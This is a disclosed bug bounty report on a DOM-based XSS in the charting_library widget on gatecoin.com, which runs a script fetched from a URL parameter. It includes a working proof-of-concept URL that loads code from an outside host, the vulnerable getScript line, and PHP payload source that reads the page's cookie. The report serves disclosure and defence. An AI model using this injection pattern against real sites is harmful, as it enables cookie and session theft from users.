# DOM Based XSS charting_library

## Report Details
- **Report ID**: 351275
- **URL**: https://hackerone.com/reports/351275
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-05-14T07:47:27.514Z
- **Disclosed**: 2018-10-19T07:53:26.464Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gatecoin

## Vulnerability Information
**Description**
charting_library contains a DOM Based XSS vulnerability that allows to load an external JS script and execute it.

**PoC**
Open URL in any browser
```
https://gatecoin.com/widget-trade/assets/charting_library/static/tv-chart.html#indicatorsFile=//blackfan.ru/tv-chart-poc&disabledFeatures=[]&enabledFeatures=[]
```

**Vulnerable script**
https://gatecoin.com/widget-trade/assets/charting_library/static/bundles/library.js

**Vulnerable code**
```js
$.getScript(urlParams.indicatorsFile)
```

blackfan.ru/tv-chart-poc source
```php
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: cache-control, X-Requested-With");
?>
alert(document.domain); 
alert(document.cookie); 
```

## Impact

DOM Based XSS

## Attachments
No attachments
